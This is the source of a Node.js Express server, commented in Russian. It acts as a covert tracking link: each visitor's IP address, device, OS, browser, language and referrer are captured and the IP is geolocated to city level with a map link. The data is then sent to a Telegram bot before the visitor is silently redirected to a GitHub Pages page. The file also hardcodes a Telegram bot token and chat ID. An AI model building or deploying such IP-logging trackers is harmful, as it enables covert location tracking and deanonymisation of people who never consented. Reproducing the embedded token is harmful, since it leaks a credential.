const express = require(‘express’);
const app = express();

const TG_TOKEN = ‘8619933114:AAFFa4SN6gAMuiJctEXl4RjJBqXV_xmxBHA’;
const TG_CHATID = ‘6120144391’;

async function sendTelegram(text) {
const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
const body = JSON.stringify({ chat_id: TG_CHATID, text, parse_mode: ‘HTML’, disable_web_page_preview: true });
const res = await fetch(url, { method: ‘POST’, headers: { ‘Content-Type’: ‘application/json’ }, body });
return res.json();
}

app.get(’/’, async (req, res) => {
try {
const ip =
req.headers[‘cf-connecting-ip’] ||
req.headers[‘x-real-ip’] ||
(req.headers[‘x-forwarded-for’] || ‘’).split(’,’)[0].trim() ||
req.socket.remoteAddress || ‘—’;

```
const ua = req.headers['user-agent'] || '—';
const referer = req.headers['referer'] || req.headers['referrer'] || 'прямой переход';
const lang = req.headers['accept-language'] || '—';

// Определяем устройство по UA
let device = '🖥 Desktop';
if (/iPhone/i.test(ua)) device = '📱 iPhone';
else if (/iPad/i.test(ua)) device = '📱 iPad';
else if (/Android.*Mobile/i.test(ua)) device = '📱 Android Phone';
else if (/Android/i.test(ua)) device = '📱 Android Tablet';

let os = 'Unknown';
if (/Windows NT 10/i.test(ua)) os = 'Windows 10/11';
else if (/Windows/i.test(ua)) os = 'Windows';
else if (/iPhone OS ([\d_]+)/i.test(ua)) { const v = ua.match(/iPhone OS ([\d_]+)/i); os = 'iOS ' + v[1].replace(/_/g, '.'); }
else if (/Android ([\d.]+)/i.test(ua)) { const v = ua.match(/Android ([\d.]+)/i); os = 'Android ' + v[1]; }
else if (/Mac OS X/i.test(ua)) os = 'macOS';
else if (/Linux/i.test(ua)) os = 'Linux';

let browser = 'Unknown';
if (/Telegram/i.test(ua)) browser = 'Telegram Browser';
else if (/YaBrowser/i.test(ua)) browser = 'Яндекс Браузер';
else if (/OPR|Opera/i.test(ua)) browser = 'Opera';
else if (/Edg/i.test(ua)) browser = 'Edge';
else if (/Chrome/i.test(ua)) browser = 'Chrome';
else if (/Safari/i.test(ua)) browser = 'Safari';
else if (/Firefox/i.test(ua)) browser = 'Firefox';

const now = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });

// Пробуем получить гео по IP
let city = '—', region = '—', country = '—', isp = '—', mapsLink = null;
try {
  const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,lat,lon`, { signal: AbortSignal.timeout(3000) });
  const geo = await geoRes.json();
  if (geo.status === 'success') {
    city = geo.city || '—';
    region = geo.regionName || '—';
    country = geo.country || '—';
    isp = geo.isp || '—';
    if (geo.lat && geo.lon) mapsLink = `https://maps.google.com/?q=${geo.lat},${geo.lon}`;
  }
} catch(e) {}

const text = [
  `👁 <b>Новый переход на визитку</b>`,
  `🕐 <b>Время:</b> ${now} (МСК)`,
  ``,
  `🌐 <b>IP:</b> <code>${ip}</code>`,
  `📍 <b>Город:</b> ${city}, ${region}`,
  `🏳 <b>Страна:</b> ${country}`,
  `🏢 <b>Провайдер:</b> ${isp}`,
  mapsLink ? `🗺 <b>На карте:</b> <a href="${mapsLink}">Открыть</a>` : '',
  ``,
  `${device}`,
  `💻 <b>ОС:</b> ${os}`,
  `🌍 <b>Браузер:</b> ${browser}`,
  `🗣 <b>Язык:</b> ${lang.split(',')[0]}`,
  `📨 <b>Источник:</b> ${referer}`,
  ``,
  `<i>User-Agent: ${ua.substring(0, 100)}</i>`,
].filter(Boolean).join('\n');

await sendTelegram(text);
```

} catch(e) {
console.error(‘Track error:’, e);
}

res.redirect(‘https://mamkagde-ops.github.io/Vizitka/’);
});

app.get(’/ping’, (req, res) => res.send(‘OK’));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Running on ${PORT}`));
